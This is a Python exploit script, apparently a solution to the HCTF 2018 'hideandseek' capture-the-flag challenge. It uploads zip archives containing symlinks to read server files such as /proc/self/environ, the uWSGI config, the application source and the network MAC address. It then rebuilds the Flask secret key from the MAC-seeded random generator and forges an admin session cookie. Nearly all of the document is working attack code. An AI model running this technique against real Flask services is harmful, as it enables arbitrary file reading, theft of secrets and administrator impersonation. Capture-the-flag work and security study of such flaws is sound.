#!/usr/bin/env python3
# coding=utf-8
import requests
import random
import re
import os
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

def read_file(file_name):
    link(file_name)
    files = {'the_file': open(file_name[-5:] + '.zip', 'rb')}
    r2 = s.post(url+'upload', files=files)
    return r2.text

def link(file_name):
    os.system('ln -s {file_name} {output}'.format(file_name = file_name, output = file_name[-5:]))
    os.system('zip -y -m {output}.zip {output}'.format(file_name = file_name, output = file_name[-5:]))


url = 'http://hideandseek.2018.hctf.io/'
with requests.Session() as s:
    user_data = {'username': '123', 'password': '123456789'}
    r = s.post(url+'login', data=user_data)
    en = read_file('/proc/self/environ')
    print(en)
    ini = re.search('UWSGI_INI=(.*?)\x00', en).group(1)
    pwd = re.search('PWD=(.*?)\x00', en).group(1)
    print(ini)
    print(pwd)
    ini = read_file(ini)
    print(ini)
    source = re.search('module = .*?\.(.*?)\n', ini).group(1)
    source = pwd+'/'+source+'.py'
    source = read_file(source)
    print(source)
    if(source.find('import') == -1):
        exit('fail')
    mac = '/sys/class/net/eth0/address'
    mac = read_file(mac)
    mac = mac[:-1]
    mac = ''.join(mac.split(':'))
    mac = int(mac, 16)
    print(mac)
    random.seed(mac)
    key = random.random()*100
    print(key)

app = Flask(__name__)
app.config['SECRET_KEY'] = str(key)
payload = {'username': 'admin'}
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session = serializer.dumps(payload)
print(session)
cookies = {'session': session}
r = requests.get(url, cookies=cookies)
print(r.text)

